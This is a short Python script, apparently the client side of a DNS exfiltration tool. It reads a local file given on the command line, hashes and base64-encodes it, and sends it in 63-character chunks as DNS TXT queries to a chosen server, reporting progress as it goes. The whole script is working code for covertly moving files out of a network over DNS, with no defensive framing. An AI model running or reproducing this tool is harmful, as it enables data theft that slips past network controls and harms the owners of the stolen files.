
import socket
import dnslib
import argparse,sys,time
import base64
from hashlib import md5




def tcp_dns_record(host, qtype, server,tcp):

    if isinstance(qtype, str):
        query = dnslib.DNSRecord.question(host, qtype=qtype)
    else:
        query = dnslib.DNSRecord(q=dnslib.DNSQuestion(host, qtype))
    query_data = query.pack()
    record = query.send(server,tcp=tcp)
    return record

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()

if __name__ == "__main__":


    p = argparse.ArgumentParser(description="DNS Client")
    p.add_argument("--file","-f",
                    help="local file you want to exfiltrate", required = True)
    p.add_argument("--server","-s",default="8.8.8.8",
                    metavar="<address:port>",
                    help="Server address:port (default:8.8.8.8:53) (port is optional)")
    p.add_argument("--tcp",action='store_true',default=False,
                    help="Use TCP (default: UDP)")
    
    args = p.parse_args()

    address,_,port = args.server.partition(':')
    port = str(port or 53)

    f = open(args.file, 'rb') 
    content = f.read() 
    hashedWord = md5(content).hexdigest()
    #print(hashedWord, md5(content))
    content_encoded = base64.standard_b64encode(content)
    chunked_content = chunkstring(content_encoded,63)
    #print("Sending file "+args.file+ " to "+address+":"+port)
    
    tcp_dns_record(args.file+"|"+str(len(content_encoded))+"|"+hashedWord, dnslib.QTYPE.TXT,address,args.tcp)
    #print(content_encoded)
    count =0 
    for chunk in chunked_content:
        count +=len(chunk)
        progress(count, len(content_encoded), status="Sending file "+args.file+ " to "+address+":"+port)
        tcp_dns_record(chunk, dnslib.QTYPE.TXT,address,args.tcp)

    print("File sent")

    
    
    #

